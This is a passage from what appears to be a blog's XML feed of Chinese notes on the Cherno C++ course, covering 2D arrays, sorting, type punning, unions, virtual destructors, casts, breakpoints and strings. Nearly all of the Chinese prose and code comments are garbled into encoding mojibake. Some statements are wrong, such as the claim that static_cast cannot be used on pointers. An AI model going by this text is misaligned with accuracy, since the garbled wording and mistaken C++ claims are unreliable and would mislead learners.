class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Function</span>();</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="64-Multidimensional-Arrays-in-C-2D-arrays">64 Multidimensional Arrays in C++ (2D arrays)</h1><p>åœ¨å¤„ç†ä»»ä½•ç±»å‹çš„æ•°ç»„æ—¶ï¼ŒæŒ‡é’ˆéƒ½æ˜¯é‡è¦çš„ï¼Œå› ä¸ºæ•°ç»„å°±æ˜¯å†…å­˜å—ï¼Œå¤„ç†å†…å­˜ç®€å•çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨æŒ‡é’ˆã€‚</p><p>äºŒç»´æ•°ç»„å°±æ˜¯æ•°ç»„çš„æ•°ç»„ï¼Œæ˜¯æ•°ç»„çš„é›†åˆï¼Œint**å°±æ˜¯æŒ‡å‘int*æ•°ç»„çš„æŒ‡é’ˆã€‚</p><p>int** a2d = new int*[5] æ‰€åšçš„å°±æ˜¯åˆ†<strong>é…20byteçš„ç©ºé—´</strong>ï¼ˆ32ä½ï¼‰ï¼Œè¿™ä¸ªç©ºé—´åç»­å¯ä»¥å­˜æ”¾å…¶ä»–ç±»å‹æ•°æ®æ¯”å¦‚floatã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// äºŒç»´æ•°ç»„</span></span><br><span class="line">  <span class="type">int</span>** a2d = <span class="keyword">new</span> <span class="type">int</span>* [<span class="number">5</span>];  <span class="comment">// ä¸º5ä¸ªæŒ‡é’ˆåˆ†é…ç©ºé—´</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    a2d[i] = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];  <span class="comment">// ä¸º5*5ä¸ªæ•°æ®åˆ†é…ç©ºé—´</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j)</span><br><span class="line">      a2d[i][j] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    <span class="keyword">delete</span>[] a2d[i];</span><br><span class="line">  <span class="keyword">delete</span>[] a2d;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¸€ç»´ç­‰æ•ˆå†™æ³•</span></span><br><span class="line">  <span class="type">int</span>* a1d = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">25</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j)</span><br><span class="line">      a1d[i * <span class="number">5</span> + j] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">delete</span>[] a1d;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å †åˆ†é…æ–¹å¼ï¼Œä¼šè¢«åˆ†é…ç†¬å†…å­˜ä¸­å®Œå…¨éšæœºçš„ä½ç½®ï¼Œå¯èƒ½å¾ˆè¿œâ€”â€”è¦è®¿é—®å…¨éƒ¨æ•°æ®ï¼Œå¯èƒ½åœ¨è®¿é—®ä¸€è¡Œæ•°æ®åï¼Œè¦è·³åˆ°å…¶ä»–ç»´åº¦ï¼Œè¿™ä¼šå¯¼è‡´ <code>cache missï¼ˆç¼“å­˜ä¸å‘½ä¸­ï¼‰</code> ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åœ¨ä»ramä¸­è·å–æ•°æ®æ—¶æµªè´¹äº†æ—¶é—´ã€‚<br><strong>å†…å­˜åˆ†é…è¶Šåˆ†æ•£æ€§èƒ½è¶Šå·®</strong>ã€‚ä¼˜åŒ–æ—¶å°½é‡è®©è®¿é—®çš„å†…å­˜å­˜å‚¨åœ¨ä¸€å—ï¼Œè¿™æ ·å®šä½æ•°æ®æ—¶ä¼šæœ‰æ›´å¤šçš„cache hitsä»¥åŠæ›´å°‘çš„cache missã€‚</p><h1 id="65-Sorting-in-C">65 Sorting in C++</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span> &#125;;</span><br><span class="line">  std::<span class="built_in">sort</span>(values.<span class="built_in">begin</span>(), values.<span class="built_in">end</span>(), [](<span class="type">int</span> a, <span class="type">int</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">1</span>)  <span class="comment">// ç¡®ä¿1æ”¾åœ¨æœ€å</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">1</span>)  <span class="comment">// åº”å½“è¿™æ ·è®¾ç½®</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> a &lt; b;</span><br><span class="line"><span class="comment">// å‡½æ•°è¿”å›å€¼å«ä¹‰ï¼šaæ˜¯å¦åº”å½“åœ¨bå‰é¢</span></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h1 id="66-Type-Punning-in-C">66 Type Punning in C++</h1><p><strong>ç±»å‹åŒå…³</strong>åªæ˜¯ä¸€ä¸ªèŠ±å“¨çš„æœ¯è¯­ï¼Œç”¨æ¥åœ¨C++ä¸­ç»•è¿‡ç±»å‹ç³»ç»Ÿã€‚<br>C++æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œæœ‰ç±»å‹ç³»ç»Ÿã€‚C++ä¸­è™½ç„¶ç±»å‹æ˜¯ç”±ç¼–è¯‘å™¨å¼ºåˆ¶æ‰§è¡Œçš„ï¼Œä½†å¯ä»¥ç›´æ¥è®¿é—®å†…å­˜ï¼Œè¿™æ˜¯ä¸€ç§åŸå§‹çš„ã€åº•å±‚çš„è®¿é—®ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">50</span>;</span><br><span class="line"><span class="type">double</span> value = a;  <span class="comment">// éšå¼è½¬æ¢ï¼Œç­‰ä»·äºdouble value = (double)a;</span></span><br><span class="line">std::cout &lt;&lt; value &lt;&lt; std::endl;  <span class="comment">// 50</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// açš„å†…å­˜ä¸º0x32</span></span><br><span class="line"><span class="comment">// bçš„å†…å­˜ä¸º0x404900 00000000</span></span><br></pre></td></tr></table></figure><p>ç±»å‹åŒå…³ï¼š<code>double value = **(double**)&amp;a;</code> å–açš„åœ°å€è½¬æ¢ä¸ºdouble*æŒ‡é’ˆï¼Œç„¶åå†è§£å¼•ç”¨ã€‚è¿™æ ·å¤„ç†ä¼šæŠŠaåé¢4å­—èŠ‚çš„å†…å­˜ä¹Ÿå¤åˆ¶è¿‡æ¥ã€‚<br>PSï¼šä½¿ç”¨å¼•ç”¨åˆ™ä¸º<code>double&amp; value = *(double*)&amp;a;</code></p><p>ç†è§£ï¼š<strong>æŠŠç›®æ ‡å†…å­˜å½“ä½œä¸åŒç±»å‹çš„å†…å­˜æ¥å¯¹å¾…ã€‚æˆ‘ä»¬æ‰€éœ€è¦åšçš„åªæ˜¯å°†è¯¥ç±»å‹ä½œä¸ºæŒ‡é’ˆï¼Œç„¶åå°†å…¶è½¬æ¢ä¸ºå¦ä¸€ä¸ªæŒ‡é’ˆï¼Œå¦‚æœç”±å¿…è¦è¿˜å¯ä»¥è¿›è¡Œè§£å¼•ç”¨ã€‚</strong></p><p>ç»“æ„ä½“ï¼ˆç±»ï¼‰æœ¬èº«ä¸åŒ…å«ä»»ä½•æ•°æ®çš„å¡«å……ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line">  <span class="type">int</span> x, y;</span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">GetPositions</span><span class="params">()</span> </span>&#123;  <span class="comment">// è®©x,yä½œä¸ºæ•°ç»„è¿”å›ï¼Œé‡æ–°å»ºæ•°ç»„å¤ªæ…¢äº†</span></span><br><span class="line"><span class="keyword">return</span> &amp;x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity e = &#123; <span class="number">5</span>, <span class="number">8</span> &#125;;</span><br><span class="line">  <span class="type">int</span>* position = (<span class="type">int</span>*)&amp;e;</span><br><span class="line">  std::cout &lt;&lt; position[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; position[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> y = *(<span class="type">int</span>*)((<span class="type">char</span>*)&amp;e + <span class="number">4</span>);  <span class="comment">// å®é™…ä¸­åƒä¸‡ä¸è¦è¿™æ ·å†™</span></span><br><span class="line">  std::cout &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* a = e.<span class="built_in">GetPositions</span>();</span><br><span class="line">  a[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">  std::cout &lt;&lt; e.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; e.y &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="67-Unions-in-C">67 Unions in C++</h1><p>è”åˆä½“æœ‰ç‚¹åƒç±»ç±»å‹æˆ–ç»“æ„ä½“ç±»å‹ï¼Œåªä¸<strong>è¿‡å®ƒä¸€æ¬¡åªèƒ½å ç”¨ä¸€ä¸ªæˆå‘˜çš„å†…å­˜ã€‚ç±»ä¸­å„ä¸ªæˆå‘˜å…±äº«å†…å­˜</strong>ï¼Œå°†açš„å€¼ä¿®æ”¹ä¸º5åˆ™dçš„å€¼ä¹Ÿä¼šä¿®æ”¹ä¸º5ã€‚</p><p>å¯ä»¥åƒä½¿ç”¨ç»“æ„ä½“å’Œç±»ä¸€æ ·ä½¿ç”¨è”åˆä½“ï¼Œå¯ä»¥ç»™å®ƒæ·»åŠ é™æ€å‡½æ•°æˆ–æ™®é€šå‡½æ•°ã€æ–¹æ³•ç­‰ã€‚<strong>ç„¶è€Œï¼Œä¸èƒ½ä½¿ç”¨è™šå‡½æ•°ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›é™åˆ¶ã€‚</strong></p><p>é€šå¸¸äººä»¬ç”¨è”åˆä½“æ¥åšçš„äº‹æ˜¯å’Œ<strong>ç±»å‹åŒå…³</strong>ç´§å¯†ç›¸å…³çš„ã€‚<br>å½“æƒ³ç»™åŒä¸€ä¸ªå˜é‡å–ä¸¤ä¸ªä¸åŒçš„åå­—æ—¶ï¼Œæˆ–<strong>æƒ³ç”¨å¤šç§æ–¹æ³•æ¥å¤„ç†ç›¸åŒçš„æ•°æ®</strong>æ—¶ï¼Œè”åˆä½“å¾ˆæœ‰ç”¨ã€‚</p><p>é€šå¸¸unionæ˜¯åŒ¿åä½¿ç”¨çš„ï¼Œä½†æ˜¯åŒ¿åunionä¸èƒ½å«æœ‰æˆå‘˜å‡½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector2</span> &#123;</span><br><span class="line">  <span class="type">float</span> x, y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector4</span> &#123;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">      <span class="type">float</span> x, y, z, w;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">      Vector2 a, b;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintVector2</span><span class="params">(Vector2 v)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; v.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; v.y &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Vector4 vector = &#123; <span class="number">1.0f</span>, <span class="number">2.0f</span>, <span class="number">3.0f</span>, <span class="number">4.0f</span> &#125;;</span><br><span class="line">  <span class="built_in">PrintVector2</span>(vector.a);</span><br><span class="line">  vector.z = <span class="number">100.0f</span>;</span><br><span class="line">  <span class="built_in">PrintVector2</span>(vector.b);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="68-Virtual-Destructors-in-C">68 Virtual Destructors in C++</h1><p>è™šææ„å‡½æ•°å°±æ˜¯<strong>è™šå‡½æ•°</strong>å’Œ<strong>ææ„å‡½æ•°</strong>çš„ç»„åˆã€‚è™šææ„å‡½æ•°å¯¹äºå¤„ç†å¤šæ€éå¸¸é‡è¦ã€‚</p><p>åœ¨æ™®é€šæ–¹æ³•å‰æ ‡è®°ä¸ºvirtualï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥è¢«è¦†å†™ï¼Œè¿™æ„å‘³ç€è™šå‡½æ•°è¡¨è¦åšè¿™æ ·çš„è®¾ç½®ã€‚<br>è™šææ„å‡½æ•°æœ‰ç‚¹ä¸åŒï¼Œè™šææ„å‡½æ•°<strong>ä¸æ˜¯è¦è¦†å†™ææ„å‡½æ•°ï¼Œè€Œæ˜¯åŠ ä¸Šä¸€ä¸ªææ„å‡½æ•°</strong>ã€‚</p><blockquote><p>ğŸ’¡ <strong>åªè¦å…è®¸ä¸€ä¸ªç±»æ‹¥æœ‰å­ç±»ï¼Œç™¾åˆ†ç™¾éœ€è¦å£°æ˜ææ„å‡½æ•°æ˜¯è™šå‡½æ•°</strong>ï¼Œå¦åˆ™æ²¡äººèƒ½å®‰å…¨åœ°æ‰©å±•æ­¤ç±»ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Base</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Base Constructor\n&quot;</span>; &#125;</span><br><span class="line">  ~<span class="built_in">Base</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Base Destructor\n&quot;</span>; &#125;  <span class="comment">// åŠ virtualåç¬¬3ç§æƒ…å†µä¸2åŒ</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Derived</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Derived Constructor\n&quot;</span>; &#125;</span><br><span class="line">  ~<span class="built_in">Derived</span>() &#123; std::cout &lt;&lt; <span class="string">&quot;Derived Destructor\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Base* base = <span class="keyword">new</span> <span class="built_in">Base</span>();</span><br><span class="line">  <span class="keyword">delete</span> base;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;----------------\n&quot;</span>;</span><br><span class="line">  Derived* derived = <span class="keyword">new</span> <span class="built_in">Derived</span>();</span><br><span class="line">  <span class="keyword">delete</span> derived;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;----------------\n&quot;</span>;</span><br><span class="line">  Base* poly = <span class="keyword">new</span> <span class="built_in">Derived</span>();</span><br><span class="line">  <span class="keyword">delete</span> poly;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Base Constructor</span><br><span class="line">Base Destructor</span><br><span class="line">----------------</span><br><span class="line">Base Constructor</span><br><span class="line">Derived Constructor</span><br><span class="line">Derived Destructor</span><br><span class="line">Base Destructor</span><br><span class="line">----------------</span><br><span class="line">Base Constructor</span><br><span class="line">Derived Constructor</span><br><span class="line">Base Destructor</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œåˆ›å»ºå­ç±»å¯¹è±¡æ—¶ï¼Œ<strong>ä¼šå…ˆè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå†è°ƒç”¨å­ç±»æ„é€ å‡½æ•°ã€‚</strong><br>åˆ é™¤å­ç±»å¯¹è±¡æ—¶ï¼Œä¼šå…ˆè°ƒç”¨å­ç±»ææ„å‡½æ•°ï¼Œå†è°ƒç”¨çˆ¶ç±»ææ„å‡½æ•°ã€‚</p><h1 id="69-Casting-in-C">69 Casting in C++</h1><p>æœ¬èŠ‚éœ€è¦ç»ƒä¹ å¹¶é€šè¿‡ç»éªŒæ¥å­¦ä¹ ï¼Œè€Œä¸æ˜¯å‘Šè¯‰å®ƒå¦‚ä½•è¿ä½œã€‚è¿™ä¸ªè¯é¢˜ä¸Šè‹¥åªä½¿ç”¨ç†è®ºè€Œæ²¡æœ‰å®è·µï¼Œåˆ™ä¸ä¼šæœ‰å¤šå¤§å¸®åŠ©ã€‚</p><p><code>(int)value</code> æ˜¯ Cè¯­è¨€é£æ ¼ç±»å‹è½¬æ¢ã€‚åœ†æ‹¬å·ä¸­æŒ‡å®šäº†è¦å¼ºåˆ¶è½¬æ¢çš„ç±»å‹ï¼Œç„¶åæ˜¯æˆ‘ä»¬è¦å¼ºåˆ¶è½¬æ¢çš„å˜é‡ï¼Œå˜é‡å¯ç”¨æ‹¬å·æ‹¬èµ·æ¥ã€‚</p><p>C++é£æ ¼ç±»å‹è½¬æ¢å…±æœ‰4ä¸­ä¸»è¦çš„castï¼Œå®ƒä»¬<strong>ä¸èƒ½åšä»»ä½•Cé£æ ¼ç±»å‹è½¬æ¢æ‰€ä¸èƒ½å¤„ç†çš„äº‹æƒ…</strong>ã€‚è¿™ä¸æ˜¯æ·»åŠ æ–°åŠŸèƒ½ï¼Œåªæ˜¯æ·»åŠ ä¸€äº›è¯­æ³•ç³–ï¼ˆdynamic_castä¼šåšè¿è¡Œæ—¶æ£€æŸ¥ï¼Œå…¶ä»–çš„ä¼šåšç¼–è¯‘æ—¶æ£€æŸ¥ï¼‰ã€‚</p><ul><li><strong>static_cast</strong> ç”¨äºè¿›è¡Œæ¯”è¾ƒâ€œè‡ªç„¶â€å’Œä½é£é™©çš„è½¬æ¢ï¼Œå¦‚æ•´å‹å’Œæµ®ç‚¹å‹ã€å­—ç¬¦å‹ä¹‹é—´çš„äº’ç›¸è½¬æ¢**ï¼Œä¸èƒ½ç”¨äºæŒ‡é’ˆç±»å‹çš„å¼ºåˆ¶è½¬æ¢ã€‚**</li><li><strong>reinterpret_cast</strong> ç”¨äºè¿›è¡Œå„ç§<strong>ä¸åŒç±»å‹çš„æŒ‡é’ˆä¹‹é—´å¼ºåˆ¶è½¬æ¢</strong>ï¼ŒæŠŠ<strong>ç›®æ ‡å†…å­˜é‡æ–°è§£é‡Šæˆåˆ«çš„ä¸œè¥¿</strong><br><code>double s = reinterpret_cast&lt;AnotherClass*&gt;(&amp;value)  + 5.3;</code> ã€‚</li><li><strong>const_cast</strong> ç”¨äºè¿›è¡Œ<strong>å»é™¤æˆ–æ·»åŠ </strong> const å±æ€§çš„è½¬æ¢ã€‚</li><li><strong>dynamic_cast</strong> ä¸æ£€æŸ¥è½¬æ¢å®‰å…¨æ€§ï¼Œ<strong>ä»…è¿è¡Œæ—¶æ£€æŸ¥ï¼ˆä¸è¿è¡Œæ—¶çŠ¶æ€ä¿¡æ¯RTTIç´§å¯†ç›¸å…³ï¼‰</strong>ï¼Œå¦‚æœä¸èƒ½è½¬æ¢ï¼Œè¿”å›nullã€‚</li></ul><p>æè¿™ä¹ˆå¤šcastçš„å¥½å¤„ï¼šé™¤äº†å¯èƒ½æ”¶åˆ°æ£€æŸ¥å¤–ï¼Œè¿˜å¯ä»¥åœ¨ä»£ç åº“ä¸­æœç´¢å®ƒä»¬ã€‚</p><h1 id="70-Conditional-and-Action-Breakpoints-in-C">70 Conditional and Action Breakpoints in C++</h1><p>æ™®é€šæ–­ç‚¹çš„ç¼ºç‚¹ï¼šéœ€è¦<strong>åœæ­¢åº”ç”¨ç¨‹åºï¼Œç„¶åé‡æ–°ç¼–è¯‘ï¼›æœ‰æ—¶è¿˜å¾ˆéš¾å¤ç°bugçŠ¶æ€</strong>ã€‚</p><p><strong>æ¡ä»¶æ–­ç‚¹</strong>ï¼šå¯ä»¥å‘Šè¯‰è°ƒè¯•å™¨ï¼Œæˆ‘æƒ³åœ¨æ­¤æ”¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œä½†æˆ‘åªå¸Œæœ›æ–­ç‚¹åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è§¦å‘ã€‚</p><p><strong>æ“ä½œæ–­ç‚¹</strong>ï¼šå…è®¸æˆ‘ä»¬é‡‡å–æŸç§åŠ¨ä½œï¼Œä¸€èˆ¬æ˜¯åœ¨ç¢°åˆ°æ–­ç‚¹æ—¶æ‰“å°ä¸€äº›ä¸œè¥¿åˆ°æ§åˆ¶å°ã€‚</p><p>å³é”®æ–­ç‚¹ï¼Œé€‰æ‹©é€‰æ‹©â€æ¡ä»¶â€œæˆ–è€…â€æ“ä½œâ€œï¼Œâ€æ“ä½œâ€ä¸­è¿˜èƒ½å–æ¶ˆå‹¾é€‰â€œç»§ç»­æ‰§è¡Œâ€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> Cherno </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Chernoç¬”è®°(31-50)</title>
      <link href="/2023/04/07/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-31-50/"/>
      <url>/2023/04/07/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-31-50/</url>
      
        <content type="html"><![CDATA[<p>è¯¾ç¨‹åœ°å€ï¼š<a href="https://www.youtube.com/watch?v=18c3MTX0PK0&amp;list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb&amp;index=1">Youtubeä¸ŠTheChernoä¸Šä¼ çš„è§†é¢‘</a><br>ç¿»è¯‘ï¼š<a href="https://www.bilibili.com/video/BV1uy4y167h2/?spm_id_from=333.788&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">ç¥ç»å…ƒçŒ«çš„é«˜è´¨é‡ç¿»è¯‘</a></p><h1 id="31-How-Strings-Work-in-C-and-how-to-use-them">31 How Strings Work in C++ (and how to use them)</h1><p>æ–°çš„C++æ ‡å‡†èˆå¼ƒäº†Cé£æ ¼çš„å­—ç¬¦ä¸²ï¼š<code>const char* name = â€œJKAâ€</code> ï¼ˆä¸çŸ¥é“ï¼Œåæ­£VS2022è¿˜èƒ½ç”¨ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* name = <span class="string">&quot;JKA&quot;</span>;  <span class="comment">// vs2017å&quot;const char*&quot;ç±»å‹å€¼ä¸èƒ½ç”¨äºåˆå§‹åŒ–åŒ–&quot;char*&quot;</span></span><br><span class="line">  std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> big = <span class="number">9</span>;  <span class="comment">// æ ˆå†…å­˜å®ˆå«ï¼Œåé¢ä¹Ÿä¼šåŠ ä¸Šccå­—èŠ‚</span></span><br><span class="line">  <span class="type">char</span> name2[<span class="number">3</span>] = &#123; <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;A&#x27;</span> &#125;;</span><br><span class="line">  <span class="comment">//char name2[4] = &#123; &#x27;J&#x27;, &#x27;K&#x27;, &#x27;A&#x27;, 0 &#125;;</span></span><br><span class="line">  std::cout &lt;&lt; name2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line">JKA</span><br><span class="line">JKAçƒ«çƒ«çƒ«çƒ«?</span><br></pre></td></tr></table></figure><p>åœ¨C++ä¸­ï¼Œä½¿ç”¨åŒå¼•å·å¼•èµ·æ¥çš„å€¼æ˜¯<code>const char*</code>ç±»å‹çš„ã€‚</p><p>ä»å³å¾€å·¦çœ‹ï¼Œconstå’Œcharé 